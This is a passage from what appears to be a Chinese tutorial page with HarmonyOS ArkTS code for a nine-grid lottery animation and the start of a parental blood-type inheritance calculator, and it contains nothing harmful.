class="attr">selectionOrder</span>: number[] = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">3</span>] <span class="comment">// 定义抽奖顺序</span></span><br><span class="line">  private <span class="attr">cellWidth</span>: number = <span class="number">200</span> <span class="comment">// 单元格宽度</span></span><br><span class="line">  private <span class="attr">baseMargin</span>: number = <span class="number">10</span> <span class="comment">// 单元格边距</span></span><br><span class="line">  @<span class="title class_">Provide</span> private <span class="attr">prizeArray</span>: <span class="title class_">Prize</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;红包&quot;</span>, <span class="string">&quot;#ff9675&quot;</span>, <span class="string">&quot;10元&quot;</span>), <span class="comment">// 初始化奖品数组，创建各种奖品对象</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;话费&quot;</span>, <span class="string">&quot;#ff9f2e&quot;</span>, <span class="string">&quot;5元&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;红包&quot;</span>, <span class="string">&quot;#8e7fff&quot;</span>, <span class="string">&quot;50元&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;红包&quot;</span>, <span class="string">&quot;#48d1ea&quot;</span>, <span class="string">&quot;30元&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;开始抽奖&quot;</span>, <span class="string">&quot;#fffdfd&quot;</span>), <span class="comment">// 抽奖按钮，没有具体奖品描述</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;谢谢参与&quot;</span>, <span class="string">&quot;#5f5f5f&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;谢谢参与&quot;</span>, <span class="string">&quot;#5f5f5f&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;超市红包&quot;</span>, <span class="string">&quot;#5f5f5f&quot;</span>, <span class="string">&quot;100元&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Prize</span>(<span class="string">&quot;鲜花&quot;</span>, <span class="string">&quot;#75b0fe&quot;</span>),</span><br><span class="line">  ]</span><br><span class="line">  private <span class="attr">intervalID</span>: number = <span class="number">0</span> <span class="comment">// 定时器ID，用于控制抽奖速度</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isSheetVisible</span>: boolean = <span class="literal">false</span> <span class="comment">// 控制底部弹出表单的可见性</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 开始抽奖逻辑</span></span><br><span class="line">  <span class="title function_">startLottery</span>(<span class="params">speed: number = <span class="number">500</span></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 设置延时执行</span></span><br><span class="line">      <span class="keyword">if</span> (speed &gt; <span class="number">50</span>) &#123; <span class="comment">// 如果速度大于50，则递归调用startLottery以逐渐加速</span></span><br><span class="line">        speed -= <span class="number">50</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">startLottery</span>(speed)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">runAtConstantSpeed</span>() <span class="comment">// 达到最高速度后进入匀速阶段</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedIndex</span>++ <span class="comment">// 每次调用时更新选中索引</span></span><br><span class="line">    &#125;, speed)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 以恒定速度运行抽奖</span></span><br><span class="line">  <span class="title function_">runAtConstantSpeed</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> speed = <span class="number">40</span> + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>) <span class="comment">// 随机生成一个速度值</span></span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalID</span>) <span class="comment">// 清除之前的定时器</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">intervalID</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 设置新的定时器来更新选中索引</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectedIndex</span> &gt;= speed) &#123; <span class="comment">// 如果选中索引达到速度值，停止并进入减速阶段</span></span><br><span class="line">        <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">intervalID</span>)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">slowDown</span>()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedIndex</span>++</span><br><span class="line">    &#125;, <span class="number">50</span>)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 减速逻辑</span></span><br><span class="line">  <span class="title function_">slowDown</span>(<span class="params">speed = <span class="number">50</span></span>) &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 设置延时执行</span></span><br><span class="line">      <span class="keyword">if</span> (speed &lt; <span class="number">500</span>) &#123; <span class="comment">// 如果速度小于500，则递归调用slowDown以逐渐减速</span></span><br><span class="line">        speed += <span class="number">50</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">slowDown</span>(speed)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">selectedIndex</span> %= <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span> <span class="comment">// 确保索引在有效范围内</span></span><br><span class="line">        <span class="keyword">let</span> index = <span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span>] <span class="comment">// 获取最终选中的奖品索引</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">false</span> <span class="comment">// 动画结束</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">getUIContext</span>().<span class="title function_">showAlertDialog</span>(&#123; <span class="comment">// 显示结果对话框</span></span><br><span class="line">          <span class="attr">title</span>: <span class="string">&#x27;结果&#x27;</span>,</span><br><span class="line">          <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[index].title&#125;</span><span class="subst">$&#123;<span class="variable language_">this</span>.prizeArray[index].description&#125;</span>`</span>, <span class="comment">// 显示奖品信息</span></span><br><span class="line">          <span class="attr">confirm</span>: &#123;</span><br><span class="line">            <span class="attr">defaultFocus</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">value</span>: <span class="string">&#x27;我知道了&#x27;</span>, <span class="comment">// 确认按钮文本</span></span><br><span class="line">            <span class="attr">action</span>: <span class="function">() =&gt;</span> &#123;&#125; <span class="comment">// 点击确认后的操作</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">alignment</span>: <span class="title class_">DialogAlignment</span>.<span class="property">Center</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">selectedIndex</span>++</span><br><span class="line">    &#125;, speed)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 构建UI方法</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// 使用Column布局容器</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123; <span class="comment">// 使用弹性布局，允许换行</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">prizeArray</span>, <span class="function">(<span class="params">item: Prize, index: number</span>) =&gt;</span> &#123; <span class="comment">// 遍历奖品数组，创建每个奖品的UI</span></span><br><span class="line">          <span class="title class_">Column</span>() &#123; <span class="comment">// 使用Column布局容器为每个奖品项</span></span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item.title&#125;</span>`</span>) <span class="comment">// 显示奖品标题</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(index == <span class="number">4</span> ? <span class="title class_">Color</span>.<span class="property">White</span> : item.<span class="property">color</span>) <span class="comment">// 设置字体颜色，对于抽奖按钮特殊处理</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">16</span>)</span><br><span class="line">            <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item.description&#125;</span>`</span>) <span class="comment">// 显示奖品描述</span></span><br><span class="line">              .<span class="title function_">fontColor</span>(index == <span class="number">4</span> ? <span class="title class_">Color</span>.<span class="property">White</span> : item.<span class="property">color</span>) <span class="comment">// 设置字体颜色</span></span><br><span class="line">              .<span class="title function_">fontSize</span>(<span class="number">20</span>)</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span>, <span class="attr">scale</span>: <span class="number">0.8</span> &#125;) <span class="comment">// 添加点击效果</span></span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// 处理点击事件</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimating</span>) &#123; <span class="comment">// 如果正在动画中，忽略点击</span></span><br><span class="line">              <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">4</span>) &#123; <span class="comment">// 如果点击的是抽奖按钮，开始抽奖</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">isAnimating</span> = <span class="literal">true</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="title function_">startLottery</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[i] == index) &#123;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">selectedIndex</span> = i <span class="comment">// 更新选中索引到对应位置</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">          .<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Center</span>) <span class="comment">// 设置水平居中对齐</span></span><br><span class="line">          .<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>) <span class="comment">// 设置垂直居中对齐</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置单元格宽度</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth&#125;</span>lpx`</span>) <span class="comment">// 设置单元格高度</span></span><br><span class="line">          .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.baseMargin&#125;</span>lpx`</span>) <span class="comment">// 设置单元格边距</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(index == <span class="number">4</span> ? <span class="string">&quot;#ff5444&quot;</span> : <span class="comment">// 抽奖按钮背景颜色特殊处理</span></span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">selectionOrder</span>[<span class="variable language_">this</span>.<span class="property">selectedIndex</span> % <span class="variable language_">this</span>.<span class="property">selectionOrder</span>.<span class="property">length</span>] == index ? <span class="title class_">Color</span>.<span class="property">Gray</span> : <span class="title class_">Color</span>.<span class="property">White</span>))</span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">// 设置圆角</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="comment">// 设置阴影效果</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">10</span>,</span><br><span class="line">            <span class="attr">color</span>: <span class="string">&quot;#f98732&quot;</span>,</span><br><span class="line">            <span class="attr">offsetX</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">offsetY</span>: <span class="number">20</span></span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellWidth * <span class="number">3</span> + <span class="variable language_">this</span>.baseMargin * <span class="number">6</span>&#125;</span>lpx`</span>) <span class="comment">// 设置整体宽度</span></span><br><span class="line">      .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">30</span> &#125;) <span class="comment">// 设置顶部边距</span></span><br><span class="line">      <span class="title class_">MyPrizeUpdate</span>().<span class="title function_">margin</span>(&#123;<span class="attr">top</span>:<span class="number">20</span>&#125;) <span class="comment">// 插入MyPrizeUpdate组件，并设置其上边距</span></span><br><span class="line">    &#125;</span><br><span class="line">    .<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置高度为100%</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// 设置宽度为100%</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#ffb350&quot;</span>) <span class="comment">// 设置页面背景颜色</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LotteryPage入口组件LotteryPage是整个抽奖应用的核心组件，负责组织页面布局和处理用户交互逻辑。它初始化了一系列必要的状态变量，比如保存所有奖品的数组prizeArray、定义抽奖顺序的selectionOrder以及控制动画状态的isAnimating等。此外，该组件实现了抽奖过程的关键方法——startLottery（开始抽奖）、runAtConstantSpeed（匀速运行）和slowDown（减速），它们共同协作以模拟真实的抽奖体验。当用户点击抽奖按钮时，这些方法按照预定的速度模式依次调用，直到最终确定一个奖品为止。最后，通过弹出对话框的方式向用户展示抽奖结果。</p><h1 id="blood"><a href="#blood" class="headerlink" title="blood"></a>blood</h1><p>血型计算</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 导入SegmentButton及其相关类型定义</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">SegmentButton</span>, <span class="title class_">SegmentButtonItemTuple</span>, <span class="title class_">SegmentButtonOptions</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 使用@Entry装饰器标记此组件为入口点</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">  <span class="comment">// 使用@Component装饰器标记此结构体为一个组件</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">  <span class="comment">// 定义一个名为BloodTypeCalculator的结构体，用于实现血型遗传计算功能</span></span><br><span class="line">struct <span class="title class_">BloodTypeCalculator</span> &#123;</span><br><span class="line">  <span class="comment">// 定义主题颜色，默认为橙色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">themeColor</span>: string | <span class="title class_">Color</span> = <span class="title class_">Color</span>.<span class="property">Orange</span>;</span><br><span class="line">  <span class="comment">// 定义文本颜色，默认为深灰色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">textColor</span>: string = <span class="string">&quot;#2e2e2e&quot;</span>;</span><br><span class="line">  <span class="comment">// 定义边框颜色，默认为浅灰色</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">lineColor</span>: string = <span class="string">&quot;#d5d5d5&quot;</span>;</span><br><span class="line">  <span class="comment">// 定义基础内边距大小，默认为30</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">basePadding</span>: number = <span class="number">30</span>;</span><br><span class="line">  <span class="comment">// 存储可能的血型结果</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">possibleBloodTypesText</span>: string = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="comment">// 存储不可能的血型结果</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">impossibleBloodTypesText</span>: string = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="comment">// 定义血型列表，包含A、B、AB、O四种血型</span></span><br><span class="line">  @<span class="title class_">State</span> private <span class="attr">bloodTypeList</span>: object[] = [<span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;A&#x27;</span> &#125;), <span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;B&#x27;</span> &#125;), <span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;AB&#x27;</span> &#125;), <span class="title class_">Object</span>(&#123; <span class="attr">text</span>: <span class="string">&#x27;O&#x27;</span> &#125;)];</span><br><span class="line">  <span class="comment">// 初始化单选胶囊按钮的配置项</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">singleSelectCapsuleOptions</span>: <span class="title class_">SegmentButtonOptions</span> | <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line">  <span class="comment">// 监听父亲血型选择变化</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;capsuleSelectedIndexesChanged&#x27;</span>) <span class="attr">fatherBloodTypeIndex</span>: number[] = [<span class="number">0</span>];</span><br><span class="line">  <span class="comment">// 监听母亲血型选择变化</span></span><br><span class="line">  @<span class="title class_">State</span> @<span class="title class_">Watch</span>(<span class="string">&#x27;capsuleSelectedIndexesChanged&#x27;</span>) <span class="attr">motherBloodTypeIndex</span>: number[] = [<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 根据血型获取其可能的基因组合</span></span><br><span class="line">  <span class="title function_">getGenes</span>(<span class="attr">bloodType</span>: string): string[] &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">`bloodType:<span class="subst">$&#123;bloodType&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">switch</span> (bloodType) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]; <span class="comment">// A型血可能的基因组合</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]; <span class="comment">// B型血可能的基因组合</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;AB&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]; <span class="comment">// AB型血可能的基因组合</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;O&#x27;</span>: <span class="keyword">return</span> [<span class="string">&#x27;O&#x27;</span>]; <span class="comment">// O型血可能的基因组合</span></span><br><span class="line">      <span class="attr">default</span>: <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Invalid blood type&#x27;</span>); <span class="comment">// 非法血型抛出错误</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 组合父母的基因以获得子代可能的基因组合</span></span><br><span class="line">  <span class="title function_">combineGenes</span>(<span class="attr">fatherGenes</span>: string[], <span class="attr">motherGenes</span>: string[]): string[] &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">possibleGenes</span>: string[] = []; <span class="comment">// 用于存储可能的基因组合</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> fatherGene <span class="keyword">of</span> fatherGenes) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> motherGene <span class="keyword">of</span> motherGenes) &#123;</span><br><span class="line">        <span class="keyword">const</span> combinedGene = [fatherGene, motherGene].<span class="title function_">sort</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>); <span class="comment">// 将父母的基因组合并排序后加入数组</span></span><br><span class="line">        <span class="keyword">if</span> (!possibleGenes.<span class="title function_">includes</span>(combinedGene)) &#123;</span><br><span class="line">          possibleGenes.<span class="title function_">push</span>(combinedGene); <span class="comment">// 如果组合尚未存在，则加入数组</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> possibleGenes; <span class="comment">// 返回所有可能的基因组合</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 根据基因组合确定血型</span></span><br><span class="line">  <span class="title function_">getBloodTypesFromGenes</span>(<span class="attr">genes</span>: string[]): string[] &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">bloodTypes</span>: string[] = []; <span class="comment">// 用于存储可能的血型</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> gene <span class="keyword">of</span> genes) &#123;</span><br><span class="line">      <span class="keyword">if</span> (gene === <span class="string">&#x27;AA&#x27;</span> || gene === <span class="string">&#x27;AO&#x27;</span> || gene === <span class="string">&#x27;OA&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;A&#x27;</span>); <span class="comment">// 基因组合为AA、AO或OA时，血型为A</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gene === <span class="string">&#x27;BB&#x27;</span> || gene === <span class="string">&#x27;BO&#x27;</span> || gene === <span class="string">&#x27;OB&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;B&#x27;</span>); <span class="comment">// 基因组合为BB、BO或OB时，血型为B</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gene === <span class="string">&#x27;AB&#x27;</span> || gene === <span class="string">&#x27;BA&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;AB&#x27;</span>); <span class="comment">// 基因组合为AB或BA时，血型为AB</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gene === <span class="string">&#x27;OO&#x27;</span>) &#123;</span><br><span class="line">        bloodTypes.<span class="title function_">push</span>(<span class="string">&#x27;O&#x27;</span>); <span class="comment">// 基因组合为OO时，血型为O</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 去除重复的血型</span></span><br><span class="line">    <span class="keyword">return</span> bloodTypes.<span class="title function_">filter</span>(<span class="function">(<span class="params">value, index, self</span>) =&gt;</span> self.<span class="title function_">indexOf</span>(value) === index);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 计算孩子可能的血型及不可能的血型</span></span><br><span class="line">  <span class="title function_">calculatePossibleBloodTypes</span>(<span class="params">father: string, mother: string</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> fatherGenes = <span class="variable language_">this</span>.<span class="title function_">getGenes</span>(father); <span class="comment">// 获取父亲的基因组合</span></span><br><span class="line">    <span class="keyword">const</span> motherGenes = <span class="variable language_">this</span>.<span class="title function_">getGenes</span>(mother); <span class="comment">// 获取母亲的基因组合</span></span><br><span class="line">    <span class="keyword">const</span> possibleGenes = <span class="variable language_">this</span>.<span class="title function_">combineGenes</span>(fatherGenes, motherGenes); <span class="comment">// 组合父母的基因</span></span><br><span class="line">    <span class="keyword">const</span> possibleBloodTypes = <span class="variable language_">this</span>.<span class="title function_">getBloodTypesFromGenes</span>(possibleGenes); <span class="comment">// 从基因组合中获取可能的血型</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">allBloodTypes</span>: string[] = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;AB&#x27;</span>, <span class="string">&#x27;O&#x27;</span>]; <span class="comment">// 所有可能的血型列表</span></span><br><span class="line">    <span class="keyword">const</span> impossibleBloodTypes = allBloodTypes.<span class="title function_">filter</span>(<span class="function"><span class="params">bt</span> =&gt;</span> !possibleBloodTypes.<span class="title function_">includes</span>(bt)); <span class="comment">// 计算不可能的血型</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">possibleBloodTypesText</span> = <span class="string">`孩子可能血型：<span 